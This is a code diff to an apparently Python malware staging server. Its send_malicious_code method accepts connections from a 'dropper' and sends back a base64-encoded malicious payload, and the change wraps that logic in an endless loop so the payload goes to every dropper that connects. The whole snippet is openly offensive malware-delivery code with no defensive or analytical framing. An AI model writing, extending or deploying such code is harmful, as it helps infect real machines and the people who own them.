@@ -51,12 +51,13 @@ class Server:
     def send_malicious_code(self):
         """ Send malware to the client once the connection is established. """
         # Establish a connection with the client.
-        connection, address = self.socket.accept()
-        with connection:
-            print('Connection with dropper established from {}'.format(address))
-            # Send data to the client and shut down the server.
-            encoded_payload = base64.b64encode(self.malicious_code)
-            connection.send(encoded_payload)
+        while True:
+            connection, address = self.socket.accept()
+            with connection:
+                print('Connection with dropper established from {}'.format(address))
+                # Send data to the client and shut down the server.
+                encoded_payload = base64.b64encode(self.malicious_code)
+                connection.send(encoded_payload)
 
 
 if __name__ == '__main__':
